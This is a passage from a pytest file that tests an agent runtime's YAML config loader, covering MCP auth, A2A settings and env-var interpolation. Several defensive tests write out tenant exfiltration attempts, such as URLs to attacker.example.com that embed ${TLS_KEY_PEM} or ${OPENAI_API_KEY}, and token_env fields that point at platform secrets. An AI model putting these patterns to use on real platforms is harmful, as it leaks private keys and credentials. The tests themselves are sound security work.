from __future__ import annotations

from pathlib import Path

import pytest
from pydantic import ValidationError

from agent_engine_runner_shared.agent_config import (
    A2AConfig,
    A2ASkillConfig,
    SecretsConfig,
    load_runtime_agent_config,
)
from agent_engine_runner_shared.runtime import TenantRuntime


def test_load_runtime_agent_config_returns_empty_when_missing(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)

    cfg = load_runtime_agent_config()

    assert cfg.path is None
    assert cfg.features.memory is None
    assert cfg.features.guardrails is None


def test_load_runtime_agent_config_reads_features(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: config-agent",
                "entrypoint: config.agent:app",
                "features:",
                "  memory: true",
                "  guardrails: false",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    assert cfg.path == tmp_path / "agent.yaml"
    assert cfg.entrypoint == "config.agent:app"
    assert cfg.feature_enabled("memory") is True
    assert cfg.feature_enabled("guardrails") is False
    # Omitted flag defaults to off (parser inert).
    assert cfg.configured_feature("use_custom_parser") is None
    assert cfg.feature_enabled("use_custom_parser") is False
    assert cfg.mcp.servers == {}


def test_load_runtime_agent_config_reads_playground(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: non-chat-agent",
                "entrypoint: brief.agent:app",
                "features:",
                "  playground: false",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    assert cfg.configured_feature("playground") is False
    assert cfg.feature_enabled("playground", default=True) is False


def test_playground_defaults_to_omitted(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "entrypoint: chat.agent:app\n",
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    assert cfg.configured_feature("playground") is None
    assert cfg.feature_enabled("playground", default=True) is True


def test_load_runtime_agent_config_reads_use_custom_parser(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: parser-agent",
                "features:",
                "  use_custom_parser: true",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    assert cfg.configured_feature("use_custom_parser") is True
    assert cfg.feature_enabled("use_custom_parser") is True


def test_load_runtime_agent_config_uses_explicit_env_path(
    monkeypatch,
    tmp_path: Path,
):
    agent_dir = tmp_path / "agents" / "support"
    agent_dir.mkdir(parents=True)
    agent_yaml = agent_dir / "agent.yaml"
    agent_yaml.write_text(
        "\n".join(
            [
                "name: support-agent",
                "entrypoint: support.agent:app",
            ]
        ),
        encoding="utf-8",
    )
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("AGENTIC_AGENT_CONFIG_PATH", str(agent_yaml))

    cfg = load_runtime_agent_config()

    assert cfg.path == agent_yaml
    assert cfg.entrypoint == "support.agent:app"


def test_load_runtime_agent_config_reads_mcp_servers(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    github:",
                "      transport: streamable_http",
                "      url: https://api.githubcopilot.com/mcp/x/issues/readonly",
                "      headers:",
                "        X-MCP-Readonly: 'true'",
                "      auth:",
                "        type: bearer_env",
                "        token_env: GITHUB_MCP_TOKEN",
                "      allowed_tools:",
                "        - search_issues",
                "      timeout_seconds: 45",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    github = cfg.mcp.servers["github"]
    assert github.transport == "streamable_http"
    assert github.url == "https://api.githubcopilot.com/mcp/x/issues/readonly"
    assert github.headers == {"X-MCP-Readonly": "true"}
    assert github.auth.type == "bearer_env"
    assert github.auth.token_env == "GITHUB_MCP_TOKEN"
    assert github.allowed_tools == ["search_issues"]
    assert github.timeout_seconds == 45


def test_load_runtime_agent_config_reads_oauth_mcp_server(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    github:",
                "      url: https://api.githubcopilot.com/mcp/",
                "      auth:",
                "        type: oauth",
                "        redirect_uri: http://127.0.0.1:8765/callback",
                "        client_name: Atlas Agent Engine Dev MCP Client",
                "        scope: repo read:user",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    github = cfg.mcp.servers["github"]
    assert github.auth.type == "oauth"
    assert github.auth.redirect_uri == "http://127.0.0.1:8765/callback"
    assert github.auth.client_name == "Atlas Agent Engine Dev MCP Client"
    assert github.auth.scope == "repo read:user"


def test_load_runtime_agent_config_reads_client_credentials_mcp_server(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    atlas:",
                "      url: https://cloud-dev.mongodb.com/api/private/mcp",
                "      auth:",
                "        type: client_credentials",
                "        client_id_env: ATLAS_MCP_CLIENT_ID",
                "        client_secret_env: ATLAS_MCP_CLIENT_SECRET",
                "        scope: ORG_MCP_ACCESS",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    atlas = cfg.mcp.servers["atlas"]
    assert atlas.auth.type == "client_credentials"
    assert atlas.auth.token_url is None
    assert atlas.auth.client_id_env == "ATLAS_MCP_CLIENT_ID"
    assert atlas.auth.client_secret_env == "ATLAS_MCP_CLIENT_SECRET"
    assert atlas.auth.scope == "ORG_MCP_ACCESS"


def test_load_runtime_agent_config_rejects_http_client_credentials_token_url(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    local:",
                "      url: https://mcp.example.com/mcp",
                "      auth:",
                "        type: client_credentials",
                "        token_url: http://127.0.0.1:8080/oauth/token",
                "        client_id_env: LOCAL_MCP_CLIENT_ID",
                "        client_secret_env: LOCAL_MCP_CLIENT_SECRET",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="auth.token_url must be an absolute https URL"):
        load_runtime_agent_config()


def test_load_runtime_agent_config_rejects_mcp_server_without_url(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    github:",
                "      transport: streamable_http",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="url"):
        load_runtime_agent_config()


def test_load_runtime_agent_config_rejects_bearer_auth_without_token_env(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    github:",
                "      url: https://api.githubcopilot.com/mcp/",
                "      auth:",
                "        type: bearer_env",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="auth.token_env"):
        load_runtime_agent_config()


@pytest.mark.parametrize(
    ("field", "expected_error"),
    [
        ("client_id_env", "auth.client_id_env"),
        ("client_secret_env", "auth.client_secret_env"),
    ],
)
def test_load_runtime_agent_config_rejects_incomplete_client_credentials_auth(
    monkeypatch,
    tmp_path: Path,
    field: str,
    expected_error: str,
):
    monkeypatch.chdir(tmp_path)
    auth_lines = {
        "token_url": "        token_url: https://cloud-dev.mongodb.com/api/oauth/token",
        "client_id_env": "        client_id_env: ATLAS_MCP_CLIENT_ID",
        "client_secret_env": "        client_secret_env: ATLAS_MCP_CLIENT_SECRET",
    }
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    atlas:",
                "      url: https://cloud-dev.mongodb.com/api/private/mcp",
                "      auth:",
                "        type: client_credentials",
                *[line for name, line in auth_lines.items() if name != field],
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match=expected_error):
        load_runtime_agent_config()


def test_load_runtime_agent_config_rejects_unsupported_client_credentials_fields(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    atlas:",
                "      url: https://cloud-dev.mongodb.com/api/private/mcp",
                "      auth:",
                "        type: client_credentials",
                "        token_url: https://cloud-dev.mongodb.com/api/oauth/token",
                "        client_id_env: ATLAS_MCP_CLIENT_ID",
                "        client_secret_env: ATLAS_MCP_CLIENT_SECRET",
                "        redirect_uri: http://127.0.0.1:8765/callback",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="auth.redirect_uri"):
        load_runtime_agent_config()


def test_load_runtime_agent_config_rejects_non_positive_mcp_timeout(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    github:",
                "      url: https://api.githubcopilot.com/mcp/",
                "      timeout_seconds: 0",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="timeout_seconds"):
        load_runtime_agent_config()


def test_load_runtime_agent_config_rejects_insecure_bearer_mcp_url(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    github:",
                "      url: http://api.githubcopilot.com/mcp/",
                "      auth:",
                "        type: bearer_env",
                "        token_env: GITHUB_MCP_TOKEN",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="https when auth.type is set"):
        load_runtime_agent_config()


def test_load_runtime_agent_config_rejects_insecure_oauth_mcp_url(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    github:",
                "      url: http://api.githubcopilot.com/mcp/",
                "      auth:",
                "        type: oauth",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="https when auth.type is set"):
        load_runtime_agent_config()


def test_load_runtime_agent_config_rejects_credential_mcp_headers(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    github:",
                "      url: https://api.githubcopilot.com/mcp/",
                "      headers:",
                "        Authorization: Bearer hardcoded",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="credential headers"):
        load_runtime_agent_config()


def test_tenant_runtime_uses_agent_yaml_features(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: runtime-agent",
                "entrypoint: runtime.agent:app",
                "features:",
                "  memory: true",
                "  guardrails: true",
            ]
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("ENABLE_MEMORY", "false")

    runtime = TenantRuntime(app_name="Runtime Agent")

    assert runtime._enable_memory is True
    assert not hasattr(runtime, "_enable_tracing")


def test_tenant_runtime_uses_legacy_env_feature_flags_when_agent_yaml_omits_them(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: runtime-agent",
                "entrypoint: runtime.agent:app",
            ]
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("ENABLE_MEMORY", "true")

    runtime = TenantRuntime(app_name="Runtime Agent")

    assert runtime._enable_memory is True


# --- A2AConfig tests ---


def test_a2a_config_defaults():
    cfg = A2AConfig()
    assert cfg.enabled is False
    assert cfg.allowed_callers == []
    assert cfg.skills == []
    assert cfg.input_modes == []
    assert cfg.output_modes == []


def test_a2a_config_full():
    cfg = A2AConfig(
        enabled=True,
        allowed_callers=["ws-a", "ws-b"],
        skills=[A2ASkillConfig(name="summarize", description="Summarize text")],
        input_modes=["text/plain"],
        output_modes=["text/plain", "application/json"],
    )
    assert cfg.enabled is True
    assert cfg.allowed_callers == ["ws-a", "ws-b"]
    assert len(cfg.skills) == 1
    assert cfg.skills[0].name == "summarize"
    assert cfg.input_modes == ["text/plain"]


def test_a2a_skill_config_with_examples():
    skill = A2ASkillConfig(
        name="translate",
        description="Translate text",
        example_input='{"text": "hello", "lang": "es"}',
        example_output="hola",
    )
    assert skill.example_input == '{"text": "hello", "lang": "es"}'
    assert skill.example_output == "hola"


def test_a2a_skill_config_rejects_empty_name():
    with pytest.raises(ValidationError):
        A2ASkillConfig(name="", description="Valid description")


def test_a2a_skill_config_rejects_empty_description():
    with pytest.raises(ValidationError):
        A2ASkillConfig(name="valid-name", description="")


def test_load_agent_yaml_with_a2a_section(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: a2a-agent",
                "entrypoint: a2a.main:app",
                "a2a:",
                "  enabled: true",
                "  skills:",
                "    - name: tell-joke",
                "      description: Tell a programming joke",
                '      example_input: \'{"topic": "python"}\'',
                "  input_modes:",
                "    - text/plain",
                "  output_modes:",
                "    - text/plain",
                "  allowed_callers:",
                "    - ws-router",
            ]
        )
    )
    cfg = load_runtime_agent_config()
    assert cfg.a2a.enabled is True
    assert len(cfg.a2a.skills) == 1
    assert cfg.a2a.skills[0].name == "tell-joke"
    assert cfg.a2a.input_modes == ["text/plain"]
    assert cfg.a2a.allowed_callers == ["ws-router"]


def test_load_agent_yaml_without_a2a_section(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: basic-agent",
                "entrypoint: basic.main:app",
            ]
        )
    )
    cfg = load_runtime_agent_config()
    assert cfg.a2a.enabled is False
    assert cfg.a2a.skills == []


def test_load_agent_yaml_with_null_a2a_section(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: basic-agent",
                "entrypoint: basic.main:app",
                "a2a: null",
            ]
        )
    )
    cfg = load_runtime_agent_config()
    assert cfg.a2a.enabled is False
    assert cfg.a2a.skills == []


def test_load_agent_yaml_with_bare_null_a2a_section(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: basic-agent",
                "entrypoint: basic.main:app",
                "a2a:",
            ]
        )
    )
    cfg = load_runtime_agent_config()
    assert cfg.a2a.enabled is False
    assert cfg.a2a.skills == []


def test_a2a_config_rejects_unknown_field():
    with pytest.raises(ValidationError):
        A2AConfig(enabled=True, allowed_caller=["ws-a"])


def test_a2a_skill_config_rejects_unknown_field():
    with pytest.raises(ValidationError):
        A2ASkillConfig(name="summarize", description="Summarize text", example="text")


def _write_mcp_url_yaml(tmp_path: Path, url_value: str, *extra_lines: str) -> None:
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    tableau:",
                f"      url: {url_value}",
                *extra_lines,
            ]
        ),
        encoding="utf-8",
    )


def test_load_runtime_agent_config_interpolates_mcp_url(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    _write_mcp_url_yaml(tmp_path, "${TABLEAU_MCP_URL}")

    cfg = load_runtime_agent_config(
        env_vars={"TABLEAU_MCP_URL": "https://tableau.example.com/mcp"},
    )

    assert cfg.mcp.servers["tableau"].url == "https://tableau.example.com/mcp"


def test_load_runtime_agent_config_interpolates_partial_mcp_url(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    _write_mcp_url_yaml(tmp_path, "https://${TABLEAU_HOST}/mcp")

    cfg = load_runtime_agent_config(env_vars={"TABLEAU_HOST": "tableau.example.com"})

    assert cfg.mcp.servers["tableau"].url == "https://tableau.example.com/mcp"


def test_load_runtime_agent_config_rejects_unset_interpolation_var(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    _write_mcp_url_yaml(tmp_path, "${TABLEAU_MCP_URL}")

    with pytest.raises(
        ValueError,
        match=r"references unset environment variables: \$\{TABLEAU_MCP_URL\}",
    ):
        load_runtime_agent_config(env_vars={})


def test_load_runtime_agent_config_rejects_interpolation_without_mapping(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    _write_mcp_url_yaml(tmp_path, "${TABLEAU_MCP_URL}")

    with pytest.raises(ValueError, match="interpolation is not enabled"):
        load_runtime_agent_config()


def test_load_runtime_agent_config_does_not_use_raw_os_environ(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("TABLEAU_MCP_URL", "https://tableau.example.com/mcp")
    _write_mcp_url_yaml(tmp_path, "${TABLEAU_MCP_URL}")

    # ``env_vars={}`` explicitly excludes the var; the loader must not fall
    # through to ``os.environ`` despite the variable being present in the
    # process environment. This is the security property that prevents
    # tenant YAML from dereferencing platform secrets like OPENAI_API_KEY.
    with pytest.raises(
        ValueError,
        match=r"references unset environment variables: \$\{TABLEAU_MCP_URL\}",
    ):
        load_runtime_agent_config(env_vars={})


def test_load_runtime_agent_config_preserves_literal_dollar_brace_outside_allowlist(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    tableau:",
                "      url: https://tableau.example.com/mcp",
                "      headers:",
                "        x-tenant: 'Reply with ${USER_NAME} verbatim'",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config(env_vars={"USER_NAME": "should-not-substitute"})

    assert cfg.mcp.servers["tableau"].headers["x-tenant"] == "Reply with ${USER_NAME} verbatim"


def test_load_runtime_agent_config_validates_url_after_interpolation(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    _write_mcp_url_yaml(tmp_path, "${TABLEAU_MCP_URL}")

    with pytest.raises(ValueError, match="must be an absolute http"):
        load_runtime_agent_config(env_vars={"TABLEAU_MCP_URL": "not-a-url"})


def test_load_runtime_agent_config_passes_literal_url_through_interpolation(
    monkeypatch,
    tmp_path: Path,
):
    monkeypatch.chdir(tmp_path)
    _write_mcp_url_yaml(tmp_path, "https://tableau.example.com/mcp")

    cfg = load_runtime_agent_config(env_vars={})

    assert cfg.mcp.servers["tableau"].url == "https://tableau.example.com/mcp"


def test_load_runtime_agent_config_preserves_bare_dollar_in_url(
    monkeypatch,
    tmp_path: Path,
):
    """``$filter`` / ``$top`` (OData query params) must NOT be treated as
    interpolation tokens. Only the ``${VAR}`` form triggers substitution.
    """
    monkeypatch.chdir(tmp_path)
    odata_url = "'https://api.example.com/data?$filter=name eq foo&$top=10'"
    _write_mcp_url_yaml(tmp_path, odata_url)

    cfg = load_runtime_agent_config(env_vars={"filter": "must-not-substitute"})

    assert (
        cfg.mcp.servers["tableau"].url == "https://api.example.com/data?$filter=name eq foo&$top=10"
    )


def test_load_runtime_agent_config_filters_platform_llm_keys_via_tenant_env_vars(
    monkeypatch,
    tmp_path: Path,
):
    """Even if a tenant tries ``url: https://attacker/${OPENAI_API_KEY}`` and
    the runtime container has ``OPENAI_API_KEY`` set, the value must NOT be
    substituted because ``tenant_env_vars()`` filters it out.
    """
    from agent_engine_runner_shared.utils import tenant_env_vars

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("OPENAI_API_KEY", "sk-platform-secret")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "ant-platform-secret")
    monkeypatch.setenv("ATLAS_GROUP_ID", "atlas-project-secret")
    _write_mcp_url_yaml(tmp_path, "https://attacker.example.com/${OPENAI_API_KEY}")

    with pytest.raises(
        ValueError,
        match=r"references unset environment variables: \$\{OPENAI_API_KEY\}",
    ):
        load_runtime_agent_config(env_vars=tenant_env_vars())


def test_load_runtime_agent_config_filters_debug_mode_keys_via_tenant_env_vars(
    monkeypatch,
    tmp_path: Path,
):
    """MDBAE_LOCAL_MODE/MDBAE_LOCAL_PORT are the operator's debug-mode plumbing:
    platform state a tenant's config interpolation must not see or substitute,
    so ``tenant_env_vars()`` filters them out."""
    from agent_engine_runner_shared.utils import tenant_env_vars

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("MDBAE_LOCAL_MODE", "true")
    monkeypatch.setenv("MDBAE_LOCAL_PORT", "5678")
    _write_mcp_url_yaml(tmp_path, "https://attacker.example.com/${MDBAE_LOCAL_MODE}")

    with pytest.raises(
        ValueError,
        match=r"references unset environment variables: \$\{MDBAE_LOCAL_MODE\}",
    ):
        load_runtime_agent_config(env_vars=tenant_env_vars())


def test_load_runtime_agent_config_filters_atlas_group_id_via_tenant_env_vars(
    monkeypatch,
    tmp_path: Path,
):
    """ATLAS_GROUP_ID is platform-owned billing attribution, not tenant env."""
    from agent_engine_runner_shared.utils import tenant_env_vars

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("ATLAS_GROUP_ID", "atlas-project-secret")
    _write_mcp_url_yaml(tmp_path, "https://attacker.example.com/${ATLAS_GROUP_ID}")

    with pytest.raises(
        ValueError,
        match=r"references unset environment variables: \$\{ATLAS_GROUP_ID\}",
    ):
        load_runtime_agent_config(env_vars=tenant_env_vars())


def test_load_runtime_agent_config_filters_tls_key_pem_via_tenant_env_vars(
    monkeypatch,
    tmp_path: Path,
):
    """TLS_KEY_PEM contains private keys and MUST NOT be interpolatable from
    tenant agent.yaml. This test proves the critical security boundary for
    HTTPS mTLS AER→OE communication.

    Even if the runtime container has ``TLS_KEY_PEM`` set (VM mode), tenant
    code trying ``url: https://attacker/${TLS_KEY_PEM}`` must fail because
    ``tenant_env_vars()`` filters it out.
    """
    from agent_engine_runner_shared.utils import tenant_env_vars

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv(
        "TLS_KEY_PEM",
        "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQE...\n-----END PRIVATE KEY-----",
    )
    # Also test the other TLS vars for completeness
    monkeypatch.setenv(
        "TLS_CERT_PEM", "-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----"
    )
    monkeypatch.setenv(
        "TLS_CA_CERT_PEM", "-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----"
    )

    # Tenant tries to exfiltrate the private key via MCP URL interpolation
    _write_mcp_url_yaml(tmp_path, "https://attacker.example.com/${TLS_KEY_PEM}")

    with pytest.raises(
        ValueError,
        match=r"references unset environment variables: \$\{TLS_KEY_PEM\}",
    ):
        load_runtime_agent_config(env_vars=tenant_env_vars())


@pytest.mark.parametrize(
    "bad_url",
    [
        "'${TABLEAU_MCP_URL'",  # unclosed
        "${}",  # empty identifier
        "${1BAD}",  # invalid identifier (starts with digit)
        "'${VAR with spaces}'",  # whitespace in identifier
    ],
)
def test_load_runtime_agent_config_rejects_malformed_var_reference(
    monkeypatch,
    tmp_path: Path,
    bad_url: str,
):
    """Malformed ``${...}`` markers must fail with a clear pointer to the
    YAML path -- not fall through to ``urlparse`` with the same confusing
    'must be an absolute http(s) URL' message.
    """
    monkeypatch.chdir(tmp_path)
    _write_mcp_url_yaml(tmp_path, bad_url)

    with pytest.raises(ValueError, match="malformed environment variable reference"):
        load_runtime_agent_config(env_vars={"TABLEAU_MCP_URL": "https://x.example.com"})


@pytest.mark.parametrize(
    "platform_var",
    [
        "A2A_JWT_SECRET",  # exact name
        "OPENAI_API_KEY",  # exact name
        "AGENT_ENTRYPOINT",  # exact name (newly added)
        "LOG_DIR",  # exact name (newly added)
        "STRUCTURED_LOGGING",  # exact name (newly added)
        "AGENTIC_AGENT_CONFIG_PATH",  # prefix-matched (``AGENTIC_``)
        "OE_URL",  # prefix-matched (``OE_``)
        "MONGOMEM_DB_NAME",  # prefix-matched (``MONGOMEM_``)
    ],
)
def test_runtime_mcp_auth_rejects_platform_owned_token_env(
    monkeypatch,
    tmp_path: Path,
    platform_var: str,
):
    """``token_env`` must not redirect the bearer-header secret-indirection
    path at a platform-owned env var. ``resolve_mcp_headers`` reads
    ``token_env`` from raw ``os.environ``, so without this validator a
    tenant could exfil ``A2A_JWT_SECRET`` (or any platform secret) by
    naming it as the token source for an MCP server they themselves
    declared in ``network.egress``.
    """
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    attacker:",
                "      url: https://attacker.example.com/mcp",
                "      auth:",
                "        type: bearer_env",
                f"        token_env: {platform_var}",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError) as exc_info:
        load_runtime_agent_config(env_vars={})
    error = str(exc_info.value)
    assert "Please use a different environment variable name" in error
    assert platform_var not in error
    assert "token_env" not in error
    assert "platform-owned" not in error
    assert "disallowed" not in error


@pytest.mark.parametrize(
    "env_field,platform_var",
    [
        pytest.param("client_id_env", "A2A_JWT_SECRET", id="client-id-exact"),
        pytest.param("client_secret_env", "OPENAI_API_KEY", id="client-secret-exact"),
        pytest.param("client_id_env", "AGENTIC_AGENT_WORKDIR", id="client-id-prefix"),
        pytest.param("client_secret_env", "OE_URL", id="client-secret-prefix"),
    ],
)
def test_runtime_mcp_auth_rejects_platform_owned_client_credentials_env(
    monkeypatch,
    tmp_path: Path,
    env_field: str,
    platform_var: str,
):
    monkeypatch.chdir(tmp_path)
    client_id_env = "TENANT_MCP_CLIENT_ID"
    client_secret_env = "TENANT_MCP_CLIENT_SECRET"
    if env_field == "client_id_env":
        client_id_env = platform_var
    else:
        client_secret_env = platform_var

    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: mcp-agent",
                "mcp:",
                "  servers:",
                "    attacker:",
                "      url: https://attacker.example.com/mcp",
                "      auth:",
                "        type: client_credentials",
                "        token_url: https://attacker.example.com/oauth/token",
                f"        client_id_env: {client_id_env}",
                f"        client_secret_env: {client_secret_env}",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError) as exc_info:
        load_runtime_agent_config(env_vars={})
    error = str(exc_info.value)
    assert "Please use a different environment variable name" in error
    assert platform_var not in error
    assert env_field not in error
    assert "platform-owned" not in error
    assert "disallowed" not in error


def test_load_runtime_agent_config_reports_every_unset_var_in_one_error(
    monkeypatch,
    tmp_path: Path,
):
    """A URL with multiple unset references must surface every missing name
    in a single error, so tenants don't burn one deploy cycle per name.
    """
    monkeypatch.chdir(tmp_path)
    _write_mcp_url_yaml(tmp_path, "https://${HOST}/${PATH}?u=${USER_ID}")

    with pytest.raises(
        ValueError,
        match=(
            r"references unset environment variables: "
            r"\$\{HOST\}, \$\{PATH\}, \$\{USER_ID\}"
        ),
    ):
        load_runtime_agent_config(env_vars={})


def test_is_platform_env_var_membership_checks():
    """``is_platform_env_var`` is the public membership helper used by
    ``agent_config`` to validate fields that name an env var.
    """
    from agent_engine_runner_shared.utils import is_platform_env_var

    # Exact names
    assert is_platform_env_var("MONGODB_URI") is True
    assert is_platform_env_var("AGENT_ENTRYPOINT") is True
    assert is_platform_env_var("LOG_DIR") is True
    assert is_platform_env_var("STRUCTURED_LOGGING") is True
    assert is_platform_env_var("CORS_ALLOWED_ORIGINS") is True
    assert is_platform_env_var("AGENT_STREAM_TERMINAL_DRAIN_TIMEOUT") is True
    assert is_platform_env_var("SHUTDOWN_GRACE_PERIOD_MS") is True
    assert is_platform_env_var("CHECKPOINTER_SERVER_SELECTION_TIMEOUT") is True
    assert is_platform_env_var("CHECKPOINTER_CONNECT_TIMEOUT") is True
    assert is_platform_env_var("CHECKPOINTER_SOCKET_TIMEOUT") is True
    assert is_platform_env_var("CHECKPOINT_DB_NAME") is True
    assert is_platform_env_var("ATLAS_GROUP_ID") is True
    # Added for tracing resource attributes / content-capture
    # platform ownership — a future accidental removal would reopen the
    # tenant agent.yaml ${VAR} interpolation-exfiltration path these guard.
    assert is_platform_env_var("WORKSPACE_ID") is True
    assert is_platform_env_var("DEPLOYMENT_ID") is True
    assert is_platform_env_var("AGENT_ID") is True
    assert is_platform_env_var("AGENT_ENGINE_ENVIRONMENT") is True
    # Prefix-matched
    assert is_platform_env_var("AGENTIC_AGENT_WORKDIR") is True
    assert is_platform_env_var("OE_URL") is True
    assert is_platform_env_var("MONGOMEM_HOST") is True
    # The runner/OE shared bearer token must never be reachable through
    # tenant ${VAR} interpolation.
    assert is_platform_env_var("RUNNER_AUTH_TOKEN") is True
    # Tenant-owned
    assert is_platform_env_var("TABLEAU_MCP_URL") is False
    assert is_platform_env_var("MY_API_TOKEN") is False
    assert is_platform_env_var("GITHUB_MCP_TOKEN") is False


def test_interpolation_walks_through_lists(monkeypatch):
    """``_interpolate_env_vars`` recurses into lists, but no production
    allowlist entry currently goes through a list. Exercise the branch via
    a temporarily-extended allowlist so a future entry like
    ``mcp.servers.*.allowed_tools.*`` cannot break it undetected.
    """
    from agent_engine_runner_shared import agent_config

    list_path = ("test_root", "values", "*")
    monkeypatch.setattr(
        agent_config,
        "_INTERPOLATABLE_PATHS",
        agent_config._INTERPOLATABLE_PATHS | {list_path},
    )

    data = {"test_root": {"values": ["${ALPHA}", "literal", "${BETA}"]}}

    resolved = agent_config._interpolate_env_vars(
        data,
